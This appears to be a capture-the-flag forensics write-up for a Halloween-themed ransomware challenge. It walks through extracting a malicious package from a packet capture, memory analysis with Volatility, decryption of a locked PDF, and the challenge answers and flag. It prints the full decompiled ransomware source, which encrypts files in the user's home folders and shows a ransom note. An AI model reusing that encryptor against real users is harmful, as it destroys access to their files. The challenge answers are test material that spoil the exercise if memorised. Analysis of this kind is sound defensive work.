
Open *poof_capture.pcap* , go to File -> Export -> HTTP and choose *pygaming-dev-13.37.tar.gz*.
Use [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor) on *configure*, and use uncompyle6 on the extracted *configure.pyc*.

---

**Analysing the mem.dmp file:**
Using tips from https://code.google.com/archive/p/volatility/wikis/LinuxMemoryForensics.wiki

```sh
vol.py --plugins=../profile/ --profile=LinuxUbuntu_4_15_0-184-generic_profilex64 -f ../mem.dmp linux_psaux
```

---

**Decryption script:**

```python
from Crypto.Cipher import AES

data = open("candy_dungeon.pdf.boo", 'rb').read()

key = 'vN0nb7ZshjAWiCzv'
iv = b'ffTC776Wt59Qawe1'
cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
pt = cipher.decrypt(data)

open("candy_dungeon.pdf", "wb").write(pt)
```

**Questions and answers:**

```txt
Which is the malicious URL that the ransomware was downloaded from? (for example: http://maliciousdomain/example/file.extension)
> http://files.pypi-install.com/packages/a5/61/caf3af6d893b5cb8eae9a90a3054f370a92130863450e3299d742c7a65329d94/pygaming-dev-13.37.tar.gz
[+] Correct!

What is the name of the malicious process? (for example: malicious)
> configure
[+] Correct!

Provide the md5sum of the ransomware file.
> 7c2ff873ce6b022663a1f133383194cc
[+] Correct!

Which programming language was used to develop the ransomware? (for example: nim)
> python
[+] Correct!

After decompiling the ransomware, what is the name of the function used for encryption? (for example: encryption)
> mv18jiVh6TJI9lzY
[+] Correct!

Decrypt the given file, and provide its md5sum.
> 3bc9f072f5a7ed4620f57e6aa8d7e1a1
[+] Correct!

[+] Here is the flag: HTB{n3v3r_tru5t_4ny0n3_3sp3c14lly_dur1ng_h4ll0w33n}
```

---

**Contents of configure.py:**

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
# [GCC 12.1.0]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: configure.py
from Crypto.Cipher import AES
import random, string, time, os

def Pkrr1fe0qmDD9nKx(filename: str, data: bytes) -> None:
    open(filename, 'wb').write(data)
    os.rename(filename, f"{filename}.boo")


def mv18jiVh6TJI9lzY(filename: str) -> None:
    data = open(filename, 'rb').read()
    key = 'vN0nb7ZshjAWiCzv'
    iv = b'ffTC776Wt59Qawe1'
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv)
    ct = cipher.encrypt(data)
    Pkrr1fe0qmDD9nKx(filename, ct)


def w7oVNKAyN8dlWJk() -> str:
    letters = string.ascii_lowercase + string.digits
    _id = ''.join(random.choice(letters) for i in range(32))
    return _id


def print_note() -> None:
    _id = w7oVNKAyN8dlWJk()
    banner = f"\n\nPippity poppity give me your property!\n\n\t   *                  ((((\n*            *        *  (((\n\t   *                (((      *\n  *   / \\        *     *(((    \n   __/___\\__  *          (((\n\t (O)  |         *     ((((\n*  '<   ? |__ ... .. .             *\n\t \\@      \\    *    ... . . . *\n\t //__     \t// ||\\__   \\    |~~~~~~ . . .   *\n====M===M===| |=====|~~~~~~   . . .. .. .\n\t\t *  \\ \\ \\   |~~~~~~    *\n  *         <__|_|   ~~~~~~ .   .     ... .\n\t\nPOOF!\n\nDon't you speak English? Use https://translate.google.com/?sl=en&tl=es&op=translate \n\nYOU GOT TRICKED! Your home folder has been encrypted due to blind trust.\nTo decrypt your files, you need the private key that only we possess. \n\nYour ID: {_id}\n\nDon't waste our time and pay the ransom; otherwise, you will lose your precious files forever.\n\nWe accept crypto or candy.\n\nDon't hesitate to get in touch with cutie_pumpkin@ransomwaregroup.com during business hours.\n\n\t"
    print(banner)
    time.sleep(60)


def yGN9pu2XkPTWyeBK(directory: str) -> list:
    filenames = []
    for filename in os.listdir(directory):
        result = os.path.join(directory, filename)
        if os.path.isfile(result):
            filenames.append(result)
        else:
            filenames.extend(yGN9pu2XkPTWyeBK(result))

    return filenames


def main() -> None:
    username = os.getlogin()
    directories = [
     f"/home/{username}/Downloads",
     f"/home/{username}/Documents",
     f"/home/{username}/Desktop"]
    for directory in directories:
        if os.path.exists(directory):
            files = yGN9pu2XkPTWyeBK(directory)
            for fil in files:
                try:
                    mv18jiVh6TJI9lzY(fil)
                except Exception as e:
                    pass

    print_note()


if __name__ == '__main__':
    main()
# okay decompiling volatility-master/configure_extracted/configure.pyc
```

---

**Contents of candy_dungeon.pdf:**

```text
Candy Dungeon
Python-Game Plan
And Script
1

Scenario
It is Halloween night and you are trick-or-treating. You go to every house in the
neighborhood, but no one is giving out candy. Finally, you come to one last house. As you
approach, you see a strange figure in the window. It looks like a skeleton! You enter the
house and the door slams shut behind you. You're now in a dark and spooky dungeon
and there are no candies inside. You hear footsteps coming towards you. What will you
do?

OBJECTIVES

1. Create the most spooky video game of the year.
2. Create an insane difficulty option so none can get candies.

MATERIALS NEEDED

1. Some cheap game development courses.
2. Google.

Plan

1. come up with a storyline and conception for the game.
2. create a prototype of the game using basic coding in Python.
3. test the game extensively.
4. make any necessary adjustments before releasing it for Halloween.
2
```